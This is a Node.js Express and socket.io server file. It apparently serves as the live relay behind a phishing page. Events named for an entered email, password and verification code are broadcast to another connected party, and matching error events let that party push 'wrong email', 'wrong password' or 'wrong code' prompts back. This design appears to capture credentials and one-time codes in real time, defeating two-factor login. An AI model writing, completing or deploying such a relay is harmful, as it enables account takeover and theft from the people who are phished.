const { createServer } = require('http');
const { Server } = require('socket.io');
const express = require('express');
const { getCurrentTime } = require('./lib/functions.js');
const cors = require('cors');

require('dotenv').config();

const app = express();
const port = process.env.PORT;

let client;

const connectedUsers = {};

// Middleware
app.use(cors());
app.use(express.json());

// Health check route
app.get('/status', (req, res) => {
	res.status(200).json({ message: `Server is reachable ${getCurrentTime()}` });
});

const httpServer = createServer(app);
const io = new Server(httpServer, {
	cors: {
		origin: '*',
	},
});

io.on('connection', (socket) => {
	console.log(`⚡: ${socket.id} user just connected! ${getCurrentTime()}`);
	connectedUsers[socket.id] = true;

	socket.on('disconnect', () => {
		if (socket.id == client) {
			socket.broadcast.emit('client-disconnect', client);
			client = null;
		}
		delete connectedUsers[socket.id];
		console.log('🔥: A user disconnected ', getCurrentTime());
	});

	socket.on('ping', (req) => {
		if (connectedUsers[req]) {
			socket.to(socket.id).emit('pong', true);
		} else {
			socket.to(socket.id).emit('pong', false);
		}
	});

	socket.on('entered-email', (req) => {
		socket.broadcast.emit('send-email', req);
	});

	socket.on('entered-password', (req) => {
		socket.broadcast.emit('send-pass', req);
	});

	socket.on('entered-code', (req) => {
		socket.broadcast.emit('send-code', req);
	});

	socket.on('error-email', (req) => {
		socket.broadcast.emit('send-email-error', req);
	});

	socket.on('error-password', (req) => {
		socket.broadcast.emit('send-password-error', req);
	});

	socket.on('error-code', (req) => {
		socket.broadcast.emit('send-code-error', req);
	});

	socket.on('client-connected', (req) => {
		if (connectedUsers[socket.id]) client = socket.id;

		socket.broadcast.emit('client-secure', socket.id);
	});
});

httpServer.listen(port, () => {
	console.log(`Server is running on port ${port}...`);
});
